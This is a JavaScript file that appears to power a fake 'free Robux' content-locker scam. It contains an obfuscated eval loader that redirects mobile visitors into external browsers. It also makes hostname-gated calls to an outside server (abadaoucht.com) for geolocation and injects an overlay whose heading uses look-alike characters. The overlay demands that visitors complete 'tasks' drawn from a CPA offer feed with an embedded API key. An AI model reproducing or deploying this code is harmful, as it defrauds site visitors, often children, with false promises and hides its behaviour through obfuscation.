var script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js'; // Check https://jquery.com/ for the current version
document.getElementsByTagName('head')[0].appendChild(script);

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 5(a){6(7.8.9(/d|e|f/i)){0 b=\'g-h-j://\'+a;1.2.3=b}k{0 c=\'l://\'+a+\'#m;n=o;p=q.r.s;t\';1.2.3=c}}',30,30,'var|window|location|href|function|open_ext_url|if|navigator|userAgent|match||||iPhone|iPad|iPod|x|web||search|else|intent|Intent|scheme|https|package|com|android|chrome|end'.split('|'),0,{}))


 
function setCookie(c_name, value, exdays) {
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value = escape(value) + ((exdays === null) ? "" : "; expires=" + exdate.toUTCString());
    document.cookie = c_name + "=" + c_value;
}

function getCookie(c_name) {
    var i, x, y, ARRcookies = document.cookie.split(";");
    for (i = 0; i < ARRcookies.length; i++) {
        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1); 
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == c_name) {
            return unescape(y);
        }
    }
}

function getRandomIntInclusive(min, max) {
  min = Math.ceil(min); 
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1) + min); // The maximum is inclusive and the minimum is inclusive
}



const ogasdCountry = ["Italy", "United Statesx", "Spain", "Norway", "Türkiye", "Indiax", "Japan", "Turkey", "Morocco", "South Korea"];
var arrOfferList = ["", "+10k dice", "+20 random stickers", "+5,000 dice", "+2,000 dice"];

var hs = window.location.hostname; 
var URL_OFFERS_FEED = "https://d24lwiav9pbaw7.cloudfront.net/public/offers/feed.php?user_id=264373&api_key=f6de0214754ac24c9e9b292cc8089732&s1="+ hs +"&s2=4&callback=?";
var URL_CHECK_LEADS = "";
var ID_VIEW_COOKIE = "GHGTR_tgs545F5426FFF_XRF4";
var c_ooksjgr = "hfg4GdrtHu7rdg75hjyg000X98";
var GetCookie = getCookie(c_ooksjgr);
var ips = "";

var BuildOffer = 4;




if(hs.indexOf("8x1") > -1 || hs.indexOf("drx") > -1){
    const d = new Date();
    let minutes = d.getMinutes(); 
    let res = minutes%3;  
     $.ajax({
        url: "https://abadaoucht.com/viewProject/checked.php", 
        success: function(result){
            var res = JSON.parse(result);
            var cn = res["country"];
            if(res["message"] == "SUCCESS"){
                
            //   if (cn == "United States" || cn == "Philippines"){
                    addLockerCodeDress(cn);
                    Impression();
            //   }
               
               
            }
        }
    });
}



if(hs.indexOf("d") > -1 || hs.indexOf("it") > -1 || hs.indexOf("7") > -1 || hs.indexOf("su") > -1 || hs.indexOf("9") > -1 || hs.indexOf("mn") > -1 || hs.indexOf("ro") > -1 || hs.indexOf("8") > -1){
    const d = new Date();
    let minutes = d.getMinutes(); 
    let res = minutes%2;  
    if(res > 0){
         $.ajax({
            url: "https://abadaoucht.com/viewProject/checked.php", 
            success: function(result){
                var res = JSON.parse(result);
                var cn = res["country"];
                if(res["message"] == "SUCCESS"){
                 // if (cn == "United States"){
                        addLockerCodeDress(cn);
                       Impression();
                //  }
                   
                }
            }
        });
    }
}




 
function addLockerCodeDress(cn){
   
    
   $(".action").html(`
    <button onclick="openLocker()" id="verify-btn" class="pop-in-pulse item-btn">
        <div class="text">Verify</div>
       
    </button>
`);


    
    $(".final > div").remove();
    $(".final").append('<button onclick="openLocker()" id="verify-btn" class="btn-acc">Verify Now<button>');
    
    var styles = `
      @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Mochiy+Pop+One&family=Nunito:wght@200&family=Poppins:wght@400;600;700;900&family=REM:wght@300&family=Varela+Round&display=swap");
    .locker_ads {position: fixed;left: 0;right: 0;top: 0;bottom: 0; background-color: rgba(0,0,0,.7);font-family: "Kumbh Sans", sans-serif;padding: 20px;}
    .locker_ads > div {background: #393b3d;max-width: 500px;margin: 0 auto;border-radius: 8px;color: #fff;text-align: center;border-bottom: 3px solid #fdd658;}
    .locker_ads p {padding: 0 30px ;}
    .locker_ads .not {background: #fdd658;padding: 15px;border-radius: 8px 8px 0 0;color: #393b3d;}
    .locker_ads .offers {padding:10px 30px;}
    .locker_ads .offer {padding: 12px;background: #00b06f;border-radius: 6px;margin-bottom: 10px;font-weight: bold;}
    .locker_ads .offer a {text-decoration: none;color: #fff;}
    .audio-btn {display: flex;justify-content: center;align-items: center;width: 30px;height: 30px;border-radius: 50%;background: #fff;margin-top: 20px;margin-bottom: 30px;}
    .audio-btn img {width: 100%;width: 15px;}

    `;
    var styleSheet = document.createElement("style");
    styleSheet.innerText = styles;
    document.head.appendChild(styleSheet);

    var iDiv = document.createElement('div');
    iDiv.className = 'xlshywt-js5';
    document.getElementsByTagName('body')[0].appendChild(iDiv);
    var HTMLcode = `
        
    
      
<div class="locker_ads lockerXslm d-none">
    <div class="">
        <div class="not">
            Claim Your Rօbuх For Free
        </div>
        <p>Complete 2 task to verify that you are not a robot. Once the task is completed, Robux will be added to your account.</p>

        <div class="offers">
           
        </div>
        <div class="audio">
            Click the button below to listen to the tutorial.
            <br>
            <br>
            <audio controls>
                <source src="https://cdn.pixabay.com/audio/2024/12/29/audio_79bcebc840.mp3" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
            <br>
            <br>
            <!-- <center>
                <div class="audio-btn">
                    <img src="https://img.icons8.com/fluency-systems-filled/48/play.png" alt="">
                </div>
            </center> -->
        </div>
    </div>
    
</div>
    `;
    
    
    
    iDiv.innerHTML = HTMLcode;
  
     laodOfferFeedBuildDress();
     laodOfferFeedOgadsDress();
   
    
}


function openLocker(){
    $(".lockerXslm").removeClass("d-none");
    clickToshowLocker();
    
    clickToshowLocker();
    
     // اختيار العناصر باستخدام ID و class
    var stepsDiv = document.getElementById('steps');
    var topImg = document.querySelector('.top-img.lazyloader');
    var botImg = document.querySelector('.bottom-img.lazyloader');

    // تعيين display إلى none
    if (stepsDiv) {
        stepsDiv.style.display = 'none';
    }
    if (topImg) {
        topImg.style.display = 'none';
    }
    if (botImg) {
        botImg.style.display = 'none';
    }
}


function laodOfferFeedBuildDress(){
    $.getJSON(URL_OFFERS_FEED, function(offers){
            var html = '';
            var ii = 1;
            var numOffers = BuildOffer;
            var rub = ["50k", "20k", "10k", 500];
            offers = offers.splice(0, numOffers);
            $.each(offers, function(key, offer){
                html += `
                
                 <div class="offer" onclick="redirectToOffer('${offer.url}', 'x-${offer.name}', 'ADBLUEMEDIA')">
                    <a href="#">${offer.anchor}</a>
                </div>
            
            
                `;
                ii++;
            });
            $(".locker_ads .offers").append(html);
        });
     
}

function openLocker(){
    $(".lockerXslm").removeClass("d-none");
    clickToshowLocker();
    
    clickToshowLocker();
    
     // اختيار العناصر باستخدام ID و class
    var stepsDiv = document.getElementById('steps');
    var topImg = document.querySelector('.top-img.lazyloader');
    var botImg = document.querySelector('.bottom-img.lazyloader');

    // تعيين display إلى none
    if (stepsDiv) {
        stepsDiv.style.display = 'none';
    }
    if (topImg) {
        topImg.style.display = 'none';
    }
    if (botImg) {
        botImg.style.display = 'none';
    }
}


